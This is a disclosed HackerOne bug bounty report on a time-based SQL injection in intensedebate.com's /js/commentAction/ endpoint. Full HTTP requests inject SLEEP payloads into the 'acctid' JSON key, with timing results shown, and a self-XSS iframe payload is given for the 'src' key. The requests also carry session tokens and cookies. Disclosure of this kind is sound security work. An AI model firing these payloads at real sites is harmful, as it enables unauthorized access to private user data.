# [intensedebate.com] SQL Injection Time Based On /js/commentAction/

## Report Details
- **Report ID**: 1044698
- **URL**: https://hackerone.com/reports/1044698
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-11-26T18:12:48.990Z
- **Disclosed**: 2021-01-01T09:19:37.451Z

## Reporter
- **Username**: fuzzme
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: automattic

## Vulnerability Information
[intensedebate.com] SQLi Time Based On /js/commentAction/

## Summary:

Hello,

I have found a SQLI Injection Time Based on `/js/commentAction/`.

When a user want to submit/reply to a comment, a JSON payload was send by a GET request.


```GET /js/commentAction/?data={"request_type":"0",+"params":+{+"firstCall":true,+"src":0,+"blogpostid":504704482,+"acctid":"251219",+"parentid":"0",+"depth":"0",+"type":"1",+"token":"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh",+"anonName":"",+"anonEmail":"X",+"anonURL":"",+"userid":"26745290",+"token":"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh",+"mblid":"1",+"tweetThis":"F",+"subscribeThis":"1",+"comment":"w"}} HTTP/1.1
Host: www.intensedebate.com```

The key `"acctid":"251219"` is vulnerable to SQL Injection Time based


## Detection :

```
GET /js/commentAction/?data={"request_type":"0",+"params":+{+"firstCall":true,+"src":0,+"blogpostid":504704482,+"acctid":"251219%20AND%20SLEEP(15)%23",+"parentid":"0",+"depth":"0",+"type":"1",+"token":"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh",+"anonName":"",+"anonEmail":"X",+"anonURL":"",+"userid":"26745290",+"token":"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh",+"mblid":"1",+"tweetThis":"F",+"subscribeThis":"1",+"comment":"w"}} HTTP/1.1
Host: www.intensedebate.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: */*
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://www.intensedebate.com/commentPopup.php?acct=0de44735e7089c61f14c17373373c235&postid=473573&posttitle=Jimmy%20Butler%20de%20retour,%20les%20Wolves%20
Cookie: login_pref=IDC; idcomments_userid=26745290; idcomments_token=6426c387ebed7ec573f03d218e0d4c2a%7C1607620848; country_code=FR; IDNewThreadComment=w
```

HTTP Response `15 414 millis`


```
GET /js/commentAction/?data={"request_type":"0",+"params":+{+"firstCall":true,+"src":0,+"blogpostid":504704482,+"acctid":"251219%20AND%20SLEEP(7)%23",+"parentid":"0",+"depth":"0",+"type":"1",+"token":"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh",+"anonName":"",+"anonEmail":"X",+"anonURL":"",+"userid":"26745290",+"token":"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh",+"mblid":"1",+"tweetThis":"F",+"subscribeThis":"1",+"comment":"w"}} HTTP/1.1
Host: www.intensedebate.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: */*
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://www.intensedebate.com/commentPopup.php?acct=0de44735e7089c61f14c17373373c235&postid=473573&posttitle=Jimmy%20Butler%20de%20retour,%20les%20Wolves%20
Cookie: login_pref=IDC; idcomments_userid=26745290; idcomments_token=6426c387ebed7ec573f03d218e0d4c2a%7C1607620848; country_code=FR; IDNewThreadComment=w
```

HTTP Response `7 660 millis`

Bonus :  the  key`"src":0` is vulnerable to self-XSS, change the value by `"<iframe%20src=%23%20onload=alert('XSS')>"` and you will see a XSS pop-up


## POC

SQLi Time based : sleep_7.png, sleep_15.png and POC.mp4
Self-XSS : Self-XSS.mp4


Thank you, good bye.

Fuzzme.

## Impact

Full database access holding private user information.

## Attachments
- sleep_7.png
- sleep_15.png
- Self-XSS.mp4
- POC.mp4
